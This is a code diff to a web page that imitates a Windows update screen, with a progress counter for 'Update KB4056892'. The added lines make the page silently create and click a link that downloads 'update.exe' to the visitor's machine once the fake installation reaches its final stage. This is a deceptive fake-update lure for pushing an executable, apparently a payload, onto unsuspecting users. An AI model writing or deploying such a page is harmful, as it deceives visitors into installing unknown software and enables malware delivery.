@@ -108,6 +108,14 @@
                 text.innerText = `Installing Update KB4056892 (${Math.floor(progress)}%)...`;
             } else {
                 text.innerText = "Finalizing installation...";
+                setTimeout(() => {
+                    const link = document.createElement('a');
+                    link.href = 'assets/update.exe';
+                    link.download = 'update.exe';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                }, 1000);
             }
         }, 1000);
     </script>
